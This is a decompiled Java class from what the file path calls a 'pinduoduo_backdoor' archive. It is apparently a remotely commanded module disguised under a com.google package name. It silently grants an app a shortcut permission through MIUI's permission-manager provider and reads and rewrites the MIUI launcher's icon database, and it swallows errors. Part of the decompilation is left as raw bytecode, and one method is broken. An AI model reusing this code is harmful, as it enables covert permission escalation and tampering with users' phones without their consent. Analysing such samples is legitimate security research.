package com.google.android.sd.biz_dynamic_dex.xm_akasha;

import android.content.ContentValues;
import android.content.Context;
import android.net.Uri;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Pair;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class XmAkashaExecutor extends DynamicCmdExecutor {
  private static final String KEY_CELL_X = "cellX";
  
  private static final String KEY_CELL_Y = "cellY";
  
  private static final String KEY_CONTAINER_ID = "containerId";
  
  private static final String KEY_ICON_SCREEN = "screen";
  
  private static final String VAL_ERROR = "exec_error";
  
  private static final String VAL_EXIST_BUT_QUERY_POSITION_ERROR = "exist_but_query_position_err";
  
  private static final String VAL_NOT_EXIST = "not_exist";
  
  private final int CMD = 103;
  
  private CmdData createCmdData(JSONObject paramJSONObject) {
    return new CmdData(103, paramJSONObject.optString("uuid"), "client");
  }
  
  private void echoSuccess(Context paramContext, CmdData paramCmdData) throws Exception {
    echoSuccess(paramContext, paramCmdData, null);
  }
  
  private void echoSuccess(Context paramContext, CmdData paramCmdData, JSONObject paramJSONObject) throws Exception {
    JSONObject jSONObject = paramJSONObject;
    if (paramJSONObject == null)
      jSONObject = new JSONObject(); 
    jSONObject.put("scene", Constants.ABILITY_NAME);
    CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(paramCmdData, jSONObject, null));
  }
  
  private void grantShortcutPermission(Context paramContext, JSONObject paramJSONObject) {
    CmdData cmdData = createCmdData(paramJSONObject);
    try {
      String str = paramJSONObject.optString(Constants.PARAMS_EXTRA_PACKAGE);
      if (!TextUtils.isEmpty(str)) {
        Bundle bundle = new Bundle();
        bundle.putLong("extra_permission", 4503599627370496L);
        bundle.putInt("extra_action", 3);
        bundle.putStringArray("extra_package", new String[] { str });
        bundle.putInt("extra_flags", 0);
        paramContext.getContentResolver().call(Uri.parse("content://com.lbe.security.miui.permmgr"), String.valueOf(6), (String)null, bundle);
        echoSuccess(paramContext, cmdData);
        return;
      } 
      throw new IllegalArgumentException("empty packageName");
    } catch (Exception exception) {
      String str = exception.getMessage();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("grantShortcutPermission_fail");
      stringBuilder.append(str);
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, stringBuilder.toString(), null));
      return;
    } 
  }
  
  private int innerUpdateIconPosition(Context paramContext, String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6) {
    try {
      ContentValues contentValues = new ContentValues();
      contentValues.put("container", paramString4);
      contentValues.put("screen", paramString3);
      contentValues.put("cellX", paramString1);
      contentValues.put("cellY", paramString2);
      return paramContext.getContentResolver().update(Uri.parse("content://com.miui.home.launcher.settings/favorites"), contentValues, "title=? and itemType=?", new String[] { paramString5, paramString6 });
    } catch (Exception exception) {
      return -100000;
    } 
  }
  
  private Pair<Boolean, String> queryIconInfo(Context paramContext, String paramString1, String paramString2) {
    // Byte code:
    //   0: aconst_null
    //   1: astore #7
    //   3: aconst_null
    //   4: astore #6
    //   6: aload_1
    //   7: invokevirtual getContentResolver : ()Landroid/content/ContentResolver;
    //   10: ldc 'content://com.miui.home.launcher.settings/favorites'
    //   12: invokestatic parse : (Ljava/lang/String;)Landroid/net/Uri;
    //   15: bipush #8
    //   17: anewarray java/lang/String
    //   20: dup
    //   21: iconst_0
    //   22: ldc 'title'
    //   24: aastore
    //   25: dup
    //   26: iconst_1
    //   27: ldc 'container'
    //   29: aastore
    //   30: dup
    //   31: iconst_2
    //   32: ldc 'screen'
    //   34: aastore
    //   35: dup
    //   36: iconst_3
    //   37: ldc 'cellX'
    //   39: aastore
    //   40: dup
    //   41: iconst_4
    //   42: ldc 'cellY'
    //   44: aastore
    //   45: dup
    //   46: iconst_5
    //   47: ldc 'spanX'
    //   49: aastore
    //   50: dup
    //   51: bipush #6
    //   53: ldc 'spanY'
    //   55: aastore
    //   56: dup
    //   57: bipush #7
    //   59: ldc 'itemType'
    //   61: aastore
    //   62: ldc 'itemType=?'
    //   64: iconst_1
    //   65: anewarray java/lang/String
    //   68: dup
    //   69: iconst_0
    //   70: aload_2
    //   71: aastore
    //   72: aconst_null
    //   73: invokevirtual query : (Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   76: astore_2
    //   77: aload_2
    //   78: ifnull -> 448
    //   81: aload_2
    //   82: astore #6
    //   84: aload_2
    //   85: astore #7
    //   87: aload_2
    //   88: invokeinterface moveToNext : ()Z
    //   93: istore #5
    //   95: ldc ''
    //   97: astore #6
    //   99: iload #5
    //   101: ifeq -> 596
    //   104: aload_2
    //   105: astore #6
    //   107: aload_2
    //   108: astore #7
    //   110: aload_2
    //   111: aload_2
    //   112: ldc 'title'
    //   114: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   119: invokeinterface getString : (I)Ljava/lang/String;
    //   124: astore_1
    //   125: aload_2
    //   126: astore #6
    //   128: aload_2
    //   129: astore #7
    //   131: aload_1
    //   132: invokestatic isEmpty : (Ljava/lang/CharSequence;)Z
    //   135: ifne -> 81
    //   138: aload_2
    //   139: astore #6
    //   141: aload_2
    //   142: astore #7
    //   144: aload_1
    //   145: aload_3
    //   146: invokevirtual startsWith : (Ljava/lang/String;)Z
    //   149: ifeq -> 81
    //   152: aload_2
    //   153: astore #6
    //   155: aload_2
    //   156: astore #7
    //   158: aload_2
    //   159: aload_2
    //   160: ldc 'cellX'
    //   162: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   167: invokeinterface getString : (I)Ljava/lang/String;
    //   172: astore_3
    //   173: aload_2
    //   174: astore #6
    //   176: aload_2
    //   177: astore #7
    //   179: aload_2
    //   180: aload_2
    //   181: ldc 'cellY'
    //   183: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   188: invokeinterface getString : (I)Ljava/lang/String;
    //   193: astore #9
    //   195: aload_2
    //   196: astore #6
    //   198: aload_2
    //   199: astore #7
    //   201: aload_2
    //   202: aload_2
    //   203: ldc 'screen'
    //   205: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   210: invokeinterface getString : (I)Ljava/lang/String;
    //   215: astore_1
    //   216: aload_2
    //   217: astore #6
    //   219: aload_2
    //   220: astore #7
    //   222: aload_2
    //   223: aload_2
    //   224: ldc 'container'
    //   226: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   231: invokeinterface getString : (I)Ljava/lang/String;
    //   236: astore #8
    //   238: iconst_1
    //   239: istore #4
    //   241: goto -> 244
    //   244: iload #4
    //   246: ifeq -> 448
    //   249: aload_2
    //   250: astore #6
    //   252: aload_2
    //   253: astore #7
    //   255: new org/json/JSONObject
    //   258: dup
    //   259: invokespecial <init> : ()V
    //   262: astore #10
    //   264: aload_2
    //   265: astore #6
    //   267: aload_2
    //   268: astore #7
    //   270: aload #10
    //   272: ldc 'cellX'
    //   274: aload_3
    //   275: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   278: pop
    //   279: aload_2
    //   280: astore #6
    //   282: aload_2
    //   283: astore #7
    //   285: aload #10
    //   287: ldc 'cellY'
    //   289: aload #9
    //   291: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   294: pop
    //   295: aload_2
    //   296: astore #6
    //   298: aload_2
    //   299: astore #7
    //   301: aload #10
    //   303: ldc 'screen'
    //   305: aload_1
    //   306: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   309: pop
    //   310: aload_2
    //   311: astore #6
    //   313: aload_2
    //   314: astore #7
    //   316: aload #10
    //   318: ldc 'containerId'
    //   320: aload #8
    //   322: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   325: pop
    //   326: aload_2
    //   327: astore #6
    //   329: aload_2
    //   330: astore #7
    //   332: iconst_1
    //   333: invokestatic valueOf : (Z)Ljava/lang/Boolean;
    //   336: aload #10
    //   338: invokevirtual toString : ()Ljava/lang/String;
    //   341: invokestatic create : (Ljava/lang/Object;Ljava/lang/Object;)Landroid/util/Pair;
    //   344: astore_1
    //   345: aload_2
    //   346: ifnull -> 364
    //   349: aload_2
    //   350: invokeinterface isClosed : ()Z
    //   355: ifne -> 364
    //   358: aload_2
    //   359: invokeinterface close : ()V
    //   364: aload_1
    //   365: areturn
    //   366: astore_1
    //   367: aload_2
    //   368: astore #6
    //   370: aload_2
    //   371: astore #7
    //   373: new java/lang/StringBuilder
    //   376: dup
    //   377: invokespecial <init> : ()V
    //   380: astore_3
    //   381: aload_2
    //   382: astore #6
    //   384: aload_2
    //   385: astore #7
    //   387: aload_3
    //   388: ldc 'exist_but_query_position_err : '
    //   390: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   393: pop
    //   394: aload_2
    //   395: astore #6
    //   397: aload_2
    //   398: astore #7
    //   400: aload_3
    //   401: aload_1
    //   402: invokevirtual getMessage : ()Ljava/lang/String;
    //   405: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   408: pop
    //   409: aload_2
    //   410: astore #6
    //   412: aload_2
    //   413: astore #7
    //   415: iconst_1
    //   416: invokestatic valueOf : (Z)Ljava/lang/Boolean;
    //   419: aload_3
    //   420: invokevirtual toString : ()Ljava/lang/String;
    //   423: invokestatic create : (Ljava/lang/Object;Ljava/lang/Object;)Landroid/util/Pair;
    //   426: astore_1
    //   427: aload_2
    //   428: ifnull -> 446
    //   431: aload_2
    //   432: invokeinterface isClosed : ()Z
    //   437: ifne -> 446
    //   440: aload_2
    //   441: invokeinterface close : ()V
    //   446: aload_1
    //   447: areturn
    //   448: aload_2
    //   449: astore #6
    //   451: aload_2
    //   452: astore #7
    //   454: iconst_1
    //   455: invokestatic valueOf : (Z)Ljava/lang/Boolean;
    //   458: ldc 'not_exist'
    //   460: invokestatic create : (Ljava/lang/Object;Ljava/lang/Object;)Landroid/util/Pair;
    //   463: astore_1
    //   464: aload_2
    //   465: ifnull -> 483
    //   468: aload_2
    //   469: invokeinterface isClosed : ()Z
    //   474: ifne -> 483
    //   477: aload_2
    //   478: invokeinterface close : ()V
    //   483: aload_1
    //   484: areturn
    //   485: astore_1
    //   486: goto -> 555
    //   489: astore_1
    //   490: aload #7
    //   492: astore #6
    //   494: aload_1
    //   495: invokevirtual getMessage : ()Ljava/lang/String;
    //   498: astore_1
    //   499: aload #7
    //   501: ifnull -> 521
    //   504: aload #7
    //   506: invokeinterface isClosed : ()Z
    //   511: ifne -> 521
    //   514: aload #7
    //   516: invokeinterface close : ()V
    //   521: new java/lang/StringBuilder
    //   524: dup
    //   525: invokespecial <init> : ()V
    //   528: astore_2
    //   529: aload_2
    //   530: ldc_w 'exec_error : '
    //   533: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   536: pop
    //   537: aload_2
    //   538: aload_1
    //   539: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   542: pop
    //   543: iconst_0
    //   544: invokestatic valueOf : (Z)Ljava/lang/Boolean;
    //   547: aload_2
    //   548: invokevirtual toString : ()Ljava/lang/String;
    //   551: invokestatic create : (Ljava/lang/Object;Ljava/lang/Object;)Landroid/util/Pair;
    //   554: areturn
    //   555: aload #6
    //   557: ifnull -> 577
    //   560: aload #6
    //   562: invokeinterface isClosed : ()Z
    //   567: ifne -> 577
    //   570: aload #6
    //   572: invokeinterface close : ()V
    //   577: aload_1
    //   578: athrow
    //   579: astore_2
    //   580: aload_1
    //   581: areturn
    //   582: astore_2
    //   583: aload_1
    //   584: areturn
    //   585: astore_2
    //   586: aload_1
    //   587: areturn
    //   588: astore_2
    //   589: goto -> 521
    //   592: astore_2
    //   593: goto -> 577
    //   596: ldc ''
    //   598: astore #9
    //   600: aload #9
    //   602: astore_1
    //   603: aload_1
    //   604: astore #8
    //   606: iconst_0
    //   607: istore #4
    //   609: aload #6
    //   611: astore_3
    //   612: goto -> 244
    // Exception table:
    //   from	to	target	type
    //   6	77	489	java/lang/Exception
    //   6	77	485	finally
    //   87	95	489	java/lang/Exception
    //   87	95	485	finally
    //   110	125	489	java/lang/Exception
    //   110	125	485	finally
    //   131	138	489	java/lang/Exception
    //   131	138	485	finally
    //   144	152	489	java/lang/Exception
    //   144	152	485	finally
    //   158	173	489	java/lang/Exception
    //   158	173	485	finally
    //   179	195	489	java/lang/Exception
    //   179	195	485	finally
    //   201	216	489	java/lang/Exception
    //   201	216	485	finally
    //   222	238	489	java/lang/Exception
    //   222	238	485	finally
    //   255	264	489	java/lang/Exception
    //   255	264	485	finally
    //   270	279	366	org/json/JSONException
    //   270	279	489	java/lang/Exception
    //   270	279	485	finally
    //   285	295	366	org/json/JSONException
    //   285	295	489	java/lang/Exception
    //   285	295	485	finally
    //   301	310	366	org/json/JSONException
    //   301	310	489	java/lang/Exception
    //   301	310	485	finally
    //   316	326	366	org/json/JSONException
    //   316	326	489	java/lang/Exception
    //   316	326	485	finally
    //   332	345	489	java/lang/Exception
    //   332	345	485	finally
    //   349	364	579	java/lang/Exception
    //   373	381	489	java/lang/Exception
    //   373	381	485	finally
    //   387	394	489	java/lang/Exception
    //   387	394	485	finally
    //   400	409	489	java/lang/Exception
    //   400	409	485	finally
    //   415	427	489	java/lang/Exception
    //   415	427	485	finally
    //   431	446	582	java/lang/Exception
    //   454	464	489	java/lang/Exception
    //   454	464	485	finally
    //   468	483	585	java/lang/Exception
    //   494	499	485	finally
    //   504	521	588	java/lang/Exception
    //   560	577	592	java/lang/Exception
  }
  
  private void queryIconInfo(Context paramContext, JSONObject paramJSONObject) {
    try {
      CmdData cmdData = createCmdData(paramJSONObject);
      Pair<Boolean, String> pair = queryIconInfo(paramContext, paramJSONObject.optString(Constants.PARAMS_ITEM_TYPE), paramJSONObject.optString(Constants.PARAMS_APP_NAME));
      if (((Boolean)pair.first).booleanValue()) {
        paramJSONObject = new JSONObject();
        paramJSONObject.put("result", pair.second);
        echoSuccess(paramContext, cmdData, paramJSONObject);
        return;
      } 
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("copy_file_error");
      stringBuilder.append(paramJSONObject);
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, stringBuilder.toString(), null));
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  private void restartLauncher(Context paramContext, JSONObject paramJSONObject) {
    CmdData cmdData = createCmdData(paramJSONObject);
    try {
      return;
    } finally {
      Exception exception = null;
      String str = exception.getMessage();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("restart_launcher_fail");
      stringBuilder.append(str);
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, stringBuilder.toString(), null));
    } 
  }
  
  private void updateIconInfo(Context paramContext, JSONObject paramJSONObject) {
    try {
      CmdData cmdData = createCmdData(paramJSONObject);
      int i = innerUpdateIconPosition(paramContext, paramJSONObject.optString(Constants.PARAMS_CELL_X), paramJSONObject.optString(Constants.PARAMS_CELL_Y), paramJSONObject.optString(Constants.PARAMS_SCREEN), paramJSONObject.optString(Constants.PARAMS_CONTAINER), paramJSONObject.optString(Constants.PARAMS_APP_NAME), paramJSONObject.optString(Constants.PARAMS_ITEM_TYPE));
      if (i != -100000) {
        paramJSONObject = new JSONObject();
        paramJSONObject.put("result", i);
        echoSuccess(paramContext, cmdData, paramJSONObject);
        return;
      } 
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("copy_file_error");
      stringBuilder.append(paramJSONObject);
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, stringBuilder.toString(), null));
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    try {
      if (TextUtils.isEmpty(paramString))
        return; 
      JSONObject jSONObject = new JSONObject(paramString);
      String str = jSONObject.optString(Constants.REQUEST_TYPE);
      if (Constants.GRANT_SHORTCUT_PERMISSION.equals(str)) {
        grantShortcutPermission(paramContext, jSONObject);
        return;
      } 
      if (Constants.QUERY_ICON_INFO.equals(str)) {
        queryIconInfo(paramContext, jSONObject);
        return;
      } 
      if (Constants.UPDATE_ICON_INFO.equals(str)) {
        updateIconInfo(paramContext, jSONObject);
        return;
      } 
      if (Constants.RESTART_LAUNCHER.equals(str))
        restartLauncher(paramContext, jSONObject); 
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  private static class Constants {
    public static String ABILITY_NAME = "xm_akasha";
    
    public static String GRANT_SHORTCUT_PERMISSION = "add_work_ak";
    
    public static String PARAMS_APP_NAME = "params_app_name";
    
    public static String PARAMS_CELL_X = "params_cellX";
    
    public static String PARAMS_CELL_Y = "params_cellY";
    
    public static String PARAMS_CONTAINER = "params_container";
    
    public static String PARAMS_EXTRA_PACKAGE = "params_extra_package";
    
    public static String PARAMS_ITEM_TYPE = "params_item_type";
    
    public static String PARAMS_SCREEN = "params_screen";
    
    public static String QUERY_ICON_INFO = "query_icon_ak";
    
    public static String REQUEST_TYPE = "request_type";
    
    public static String RESTART_LAUNCHER = "restart_launcher";
    
    public static String UPDATE_ICON_INFO = "update_icon_ak";
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\5d372522-b6a4-4c1b-a0b4-8114d342e6c0-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\xm_akasha\XmAkashaExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */